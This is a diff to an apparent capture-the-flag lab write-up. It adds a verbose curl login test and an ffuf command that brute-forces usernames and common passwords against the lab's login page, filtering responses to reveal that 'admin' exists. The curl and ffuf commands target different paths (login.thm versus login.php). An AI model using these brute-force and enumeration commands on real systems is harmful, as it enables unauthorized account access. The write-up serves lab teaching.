@@ -26,7 +26,18 @@ We can see the username and password parameter in the source code clearly.
 Using this parameter We will hit a curl req with below command to test for valid req.
 
 ```
-curl -X POST http://lookup.thm/login.thm -d "username=orion&password=1234"
+curl -v -X POST http://lookup.thm/login.thm -d "username=orion&password=1234"
+```
+
+The Req header in the curl were 
+```
+> POST /login.thm HTTP/1.1
+> Host: lookup.thm
+> User-Agent: curl/8.18.0
+> Accept: */*
+> Content-Length: 28
+> Content-Type: application/x-www-form-urlencoded
+
 ```
 
 And it was working it gave me the real wrong credentials error that i got in browser manual login too.
@@ -43,7 +54,7 @@ Now finally that we are waiting for..
  So we will do the below command to do enumuration to login page.
  But Before doing so we need to manually send 1 req first to get the response size and number of words in a invalid response.
 
-so i did 
+so as according to curl output i did 
 ```
 ffuf -u http://lookup.thm/login.php \
 -w <(echo "random_user"):USER \
@@ -59,12 +70,17 @@ Now what i got as output was
     * PASS: random_pass
     * USER: random_user
 ```
+<ffuf_image>
+**so as according to curl output and Now we know that invalid response have response size 74 and response words 10**
 ```
 ffuf -v  -u http://lookup.thm/login.php \
 -w /home/Seclists/Usernames/top-usernames-shortlist.txt:USER \
 -w /home/Seclists/Passwords/Common-Credentials/best15.txt:PASS \
 -X POST \
 -d "username=USER&password=PASS" \
+-H "Content-Type: application/x-www-form-urlencoded" \
+-fs 74 -fw 10 
 ```
 
-Everything was looking fine what i was 
+Now we can see for admin the response was differ. So we tried with admin username in browser and the error was 
+``` Wrong password. Please try again. ```
